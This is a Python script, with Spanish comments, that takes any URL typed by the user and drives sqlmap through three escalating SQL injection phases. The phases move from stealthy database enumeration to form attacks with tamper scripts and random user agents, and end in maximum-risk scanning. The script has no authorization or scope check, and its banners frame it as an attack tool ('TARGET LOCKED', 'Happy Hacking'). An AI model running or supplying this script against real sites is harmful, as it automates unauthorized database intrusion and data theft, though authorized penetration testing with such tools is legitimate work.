import subprocess
import sys
import shutil
import os
import time
import signal
from typing import Final, List, Iterator, Optional, Dict, Generator, Any
from dataclasses import dataclass, field
from functools import wraps
from datetime import datetime

# --- 1. Decoradores: Lógica Transversal ---

def audit_execution(phase_name: str):
    """
    Decorador 'Pro' para medir el rendimiento y loguear el ciclo de vida
    de cada fase de ataque sin ensuciar la lógica de negocio.
    """
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs) -> Any:
            print(f"\n[{datetime.now().strftime('%H:%M:%S')}] 🚀 INICIANDO PROTOCOLO: {phase_name.upper()}")
            start_time = time.perf_counter()
            try:
                result = func(*args, **kwargs)
                return result
            except Exception as e:
                print(f"[!] Excepción crítica en {phase_name}: {e}")
                raise
            finally:
                elapsed = time.perf_counter() - start_time
                print(f"[{datetime.now().strftime('%H:%M:%S')}] 🏁 FIN PROTOCOLO {phase_name}. Tiempo: {elapsed:.2f}s")
                print("-" * 60)
        return wrapper
    return decorator

# --- 2. Estructuras de Datos Inmutables ---

@dataclass(frozen=True)
class PhaseConfig:
    """Blueprint inmutable para definir una fase de ataque."""
    name: str
    level: int
    risk: int
    flags: List[str] = field(default_factory=list)

    @property
    def cmd_signature(self) -> str:
        return f"L{self.level}::R{self.risk}::{self.name}"

# --- 3. El Core: Arquitectura Orientada a Objetos y Generadores ---

class SqlMapArchitect:
    """
    Orquestador de ataques SQL Injection.
    Usa patrones de diseño para desacoplar la estrategia de la ejecución.
    """

    def __init__(self, target_url: str):
        self.target: Final[str] = self._sanitize_target(target_url)
        self._binary: Final[Optional[str]] = shutil.which("sqlmap")
        
        if not self._binary:
            raise EnvironmentError("❌ SQLMap no encontrado en el PATH. Instálalo, primer aviso.")

    @staticmethod
    def _sanitize_target(url: str) -> str:
        """Sanitización estricta usando comprensión de listas."""
        return "".join(ch for ch in url if ord(ch) >= 32).strip()

    def _strategy_generator(self) -> Generator[PhaseConfig, None, None]:
        """
        Generador (yield) que define la escalada de privilegios.
        CORRECCIÓN: De menos a más. Primero sigilo, luego fuerza bruta.
        """
        # Fase 1: Rápida y Silenciosa (Smart Scan)
        yield PhaseConfig(
            name="Infiltración Ghost (Recon)", 
            level=1, 
            risk=1, 
            flags=["--smart", "--batch", "--random-agent", "--dbs"]
        )
        # Fase 2: Específica y Táctica (Si la 1 falla o para profundizar)
        yield PhaseConfig(
            name="Asalto Táctico (Heurística)", 
            level=3, 
            risk=2, 
            flags=["--batch", "--tamper=space2comment", "--threads=5", "--forms"]
        )
        # Fase 3: Ruido Máximo (Solo si estás desesperado)
        yield PhaseConfig(
            name="Demolición Berserker (Full Noise)", 
            level=5, 
            risk=3, 
            flags=["--batch", "--level=5", "--risk=3", "--random-agent", "--hex"]
        )

    def _execute_subprocess(self, cmd: List[str]) -> Iterator[str]:
        """
        Closure que encapsula la ejecución del proceso y cede el control (yield)
        línea por línea para análisis en tiempo real (Non-blocking I/O).
        """
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        # Stream output in real-time
        if process.stdout:
            for line in process.stdout:
                yield line.strip()
        
        process.wait()
        if process.returncode != 0:
            raise subprocess.CalledProcessError(process.returncode, cmd)

    def engage(self) -> None:
        """Bucle principal de ejecución."""
        print(f"🎯 TARGET LOCKED: {self.target}\n")

        for phase in self._strategy_generator():
            self._run_phase(phase)

    @audit_execution("Phase Runner")
    def _run_phase(self, phase: PhaseConfig) -> None:
        """Construye y lanza el comando para una fase específica."""
        
        # Construcción dinámica del comando
        command: List[str] = [
            self._binary, # type: ignore
            "-u", self.target
        ] + [f"--level={phase.level}", f"--risk={phase.risk}"] + phase.flags

        print(f"🛠️ Ejecutando estrategia: {phase.cmd_signature}")
        
        try:
            # Consumimos el generador del subproceso
            for log_line in self._execute_subprocess(command):
                # Filtro de ruido: Solo mostramos info relevante o dejamos que sqlmap hable
                # Aquí podrías meter lógica de IA para detectar "Vulnerable" y parar.
                if "CRITICAL" in log_line or "ERROR" in log_line:
                    print(f"🔴 {log_line}")
                elif "information" in log_line.lower():
                     print(f"🟢 {log_line}")
                else:
                    # Opcional: imprimir todo o silenciar ruido
                    # print(f"  Running... {log_line[:50]}", end='\r') 
                    pass 

        except subprocess.CalledProcessError:
            print(f"⚠️ La fase {phase.name} falló o fue bloqueada por WAF.")
        except KeyboardInterrupt:
            print("\n🛑 Abortando manualmente...")
            raise # Re-lanzamos para salir del bucle principal

# --- 4. Entry Point ---

def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("""
    ███╗   ███╗██╗██████╗ ██╗     ███╗   ██╗██╗██████╗ 
    ████╗ ████║██║██╔══██╗██║     ████╗  ██║██║██╔══██╗
    ██╔████╔██║██║██║  ██║██║     ██╔██╗ ██║██║██████╔╝
    ██║╚██╔╝██║██║██║  ██║██║     ██║╚██╗██║██║██╔══██╗
    ██║ ╚═╝ ██║██║██████╔╝███████╗██║ ╚████║██║██║  ██║
    ╚═╝     ╚═╝╚═╝╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝
           >> ARCHITECT EDITION v2.0 <<
    """)

    try:
        target = input("🔥 Introduce URL Objetivo: ").strip()
        if not target:
            print("😒 En serio? Dame una URL."); sys.exit(1)
        
        bot = SqlMapArchitect(target)
        bot.engage()

    except KeyboardInterrupt:
        print("\n👋 Saliendo. Happy Hacking.")
    except Exception as e:
        print(f"\n💥 Error fatal no controlado: {e}")

if __name__ == "__main__":
    main()